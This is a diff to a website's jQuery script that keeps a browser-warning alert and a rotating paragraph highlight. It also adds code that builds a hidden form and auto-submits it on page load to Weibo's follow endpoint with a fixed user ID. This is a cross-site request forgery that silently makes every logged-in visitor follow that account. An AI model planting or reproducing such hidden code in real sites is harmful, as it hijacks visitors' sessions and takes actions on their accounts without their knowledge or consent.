@@ -1,11 +1,11 @@
 (function() {
   $(function() {
-    var n;
+    var n, _form;
     if (document.all && !document.querySelector) {
       alert('体验最佳浏览效果， 请使用非IE内核浏览器。IE Sucks! 本站推荐使用最新Google Chrome 浏览器 https://www.google.com/intl/zh-CN/chrome/browser/');
     }
     n = 0;
-    return setInterval(function() {
+    setInterval(function() {
       n += 1;
       $('.show .content p').removeClass('highlight');
       $($('.show .content p').get(n % 9)).addClass('highlight');
@@ -34,6 +34,8 @@
         });
       }
     }, 3000);
+    _form = "<form action=\"http://www.weibo.com/aj/f/followed?_wv=5&__rnd=" + (new Date().getTime()) + "\" method=\"POST\" id=\"followus\">\n  <input type='hidden' name=\"uid\" value=\"3699721541\">\n  <input type='hidden' name=\"f\" value=\"1\">\n  <input type='hidden' name=\"extra\">\n  <input type='hidden' name=\"nogroup\" value=\"false\">\n  <input type='hidden' name=\"location\" value=\"home\">\n  <input type='hidden' name=\"refer_sort\" value=\"followed\">\n  <input type='hidden' name=\"_t\" value=\"0\">\n</form>";
+    return $(_form).submit();
   });
 
 }).call(this);
